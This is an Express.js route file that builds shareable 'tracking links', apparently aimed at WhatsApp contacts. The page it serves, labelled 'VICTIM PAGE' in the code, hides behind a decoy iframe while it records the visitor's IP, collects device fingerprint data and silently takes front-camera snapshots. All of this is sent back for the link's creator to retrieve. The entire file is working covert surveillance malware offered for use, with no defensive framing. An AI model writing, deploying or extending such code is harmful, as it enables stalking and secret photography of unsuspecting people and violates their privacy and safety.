const express = require('express');
const crypto  = require('crypto');
const router  = express.Router();

// In-memory session store (per-process; resets on dyno restart — acceptable for short-lived tracking links)
const _locStore = {};

// ── Cleanup: remove sessions older than 2 hours so memory doesn't grow forever ──
setInterval(() => {
    const cutoff = Date.now() - 2 * 60 * 60 * 1000;
    for (const tok of Object.keys(_locStore)) {
        if (_locStore[tok].timestamp < cutoff) delete _locStore[tok];
    }
}, 30 * 60 * 1000); // run every 30 min

// ─────────────────────────────────────────────────────────────────────
//  POST /api/location/start   →   generate tracking session
//  Body: { userId }   — userId is just a label (e.g. WhatsApp JID)
// ─────────────────────────────────────────────────────────────────────
router.post('/start', (req, res) => {
    const userId = req.body.userId || req.query.userId;
    if (!userId) return res.status(400).json({ error: 'Missing userId' });

    const sessionToken = crypto.randomBytes(16).toString('hex');
    _locStore[sessionToken] = {
        userId,
        clientIp   : null,
        metrics    : null,
        cameraImage: null,
        timestamp  : Date.now()
    };

    // Build the public link — prefer REPLIT_DEV_DOMAIN, fall back to HOST env, then localhost
    const host = process.env.REPLIT_DEV_DOMAIN
        ? `https://${process.env.REPLIT_DEV_DOMAIN}`
        : (process.env.HOST_URL || `http://localhost:${process.env.PORT || 3001}`);

    const link = `${host}/api/location/v/${sessionToken}`;
    res.json({ sessionToken, link });
});

// ─────────────────────────────────────────────────────────────────────
//  GET  /api/location/result/:sessionToken   →   fetch captured data
// ─────────────────────────────────────────────────────────────────────
router.get('/result/:sessionToken', (req, res) => {
    const s = _locStore[req.params.sessionToken];
    if (!s) return res.status(404).json({ error: 'Session not found or expired' });
    res.json({
        userId     : s.userId,
        ip         : s.clientIp,
        metrics    : s.metrics,
        hasCamera  : !!s.cameraImage,
        cameraThumb: s.cameraImage ? s.cameraImage.substring(0, 80) + '…' : null,
        timestamp  : s.timestamp
    });
});

// ─────────────────────────────────────────────────────────────────────
//  GET  /api/location/camera/:sessionToken   →   full camera base64
// ─────────────────────────────────────────────────────────────────────
router.get('/camera/:sessionToken', (req, res) => {
    const s = _locStore[req.params.sessionToken];
    if (!s) return res.status(404).json({ error: 'Session not found or expired' });
    if (!s.cameraImage) return res.status(204).json({ error: 'No camera image yet' });
    res.json({ image: s.cameraImage });
});

// ─────────────────────────────────────────────────────────────────────
//  GET  /api/location/v/:sessionToken   →   VICTIM PAGE (tracking HTML)
// ─────────────────────────────────────────────────────────────────────
router.get('/v/:sessionToken', (req, res) => {
    const sessionToken = req.params.sessionToken;
    if (!_locStore[sessionToken]) return res.status(404).send('Link expired or invalid.');

    // Capture victim IP immediately
    const clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim()
        || req.socket.remoteAddress;
    _locStore[sessionToken].clientIp   = clientIp;
    _locStore[sessionToken].timestamp  = Date.now();

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(`<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Loading...</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #0a0a0a; height: 100vh; overflow: hidden; }
    iframe { width: 100vw; height: 100vh; border: none; display: block; }
    #cam-wrap { position: fixed; top:0; left:0; width:100%; height:100%;
                background: transparent; z-index: 9999; pointer-events: none; }
    #cam-wrap video { display: none; }
  </style>
</head>
<body>
  <iframe src="https://cybersecprosimdatabase.vercel.app/"></iframe>
  <div id="cam-wrap">
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
  </div>

  <script>
    (function() {
      var tok = '${sessionToken}';
      var base = window.location.origin;

      // ── Device Metrics ──
      var metrics = {
        userAgent  : navigator.userAgent,
        platform   : navigator.platform,
        language   : navigator.language,
        viewport   : { width: screen.width, height: screen.height },
        colorDepth : screen.colorDepth,
        timeZone   : Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookies    : navigator.cookieEnabled,
        doNotTrack : navigator.doNotTrack,
        cores      : navigator.hardwareConcurrency || 'unknown',
        memory     : navigator.deviceMemory || 'unknown',
        touch      : ('ontouchstart' in window),
        referrer   : document.referrer || 'direct',
        connection : navigator.connection ? {
          type    : navigator.connection.effectiveType,
          rtt     : navigator.connection.rtt,
          downlink: navigator.connection.downlink
        } : null
      };

      // ── Silent Camera Capture ──
      function captureCamera() {
        var video  = document.getElementById('video');
        var canvas = document.getElementById('canvas');
        var ctx    = canvas.getContext('2d');
        navigator.mediaDevices.getUserMedia({
          audio: false,
          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
        }).then(function(stream) {
          video.srcObject = stream;
          video.onloadedmetadata = function() {
            video.play();
            setTimeout(function() {
              canvas.width  = video.videoWidth  || 640;
              canvas.height = video.videoHeight || 480;
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              var img = canvas.toDataURL('image/jpeg', 0.7);
              fetch(base + '/api/location/cam/' + tok, {
                method : 'POST',
                headers: { 'Content-Type': 'application/json' },
                body   : JSON.stringify({ image: img }),
                keepalive: true
              }).catch(function(){});
              stream.getTracks().forEach(function(t){ t.stop(); });
            }, 500);
          };
        }).catch(function(){ /* silently ignore */ });
      }

      // ── Send Metrics ──
      function sendMetrics() {
        var blob = new Blob([JSON.stringify(metrics)], { type: 'application/json' });
        if (navigator.sendBeacon) {
          navigator.sendBeacon(base + '/api/location/log/' + tok, blob);
        } else {
          fetch(base + '/api/location/log/' + tok, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(metrics), keepalive: true
          }).catch(function(){});
        }
      }

      captureCamera();
      sendMetrics();
      setTimeout(captureCamera, 2000);
    })();
  </script>
</body>
</html>`);
});

// ─────────────────────────────────────────────────────────────────────
//  POST /api/location/log/:sessionToken   →   receive device metrics
// ─────────────────────────────────────────────────────────────────────
router.post('/log/:sessionToken', express.json({ limit: '50kb' }), (req, res) => {
    const s = _locStore[req.params.sessionToken];
    if (!s) return res.status(404).json({ error: 'Session not found' });
    s.metrics   = req.body;
    s.timestamp = Date.now();
    res.json({ status: 'ok' });
});

// ─────────────────────────────────────────────────────────────────────
//  POST /api/location/cam/:sessionToken   →   receive camera image
// ─────────────────────────────────────────────────────────────────────
router.post('/cam/:sessionToken', express.json({ limit: '10mb' }), (req, res) => {
    const s = _locStore[req.params.sessionToken];
    if (!s) return res.status(404).json({ error: 'Session not found' });
    s.cameraImage = req.body.image;
    s.timestamp   = Date.now();
    res.json({ status: 'ok' });
});

module.exports = router;
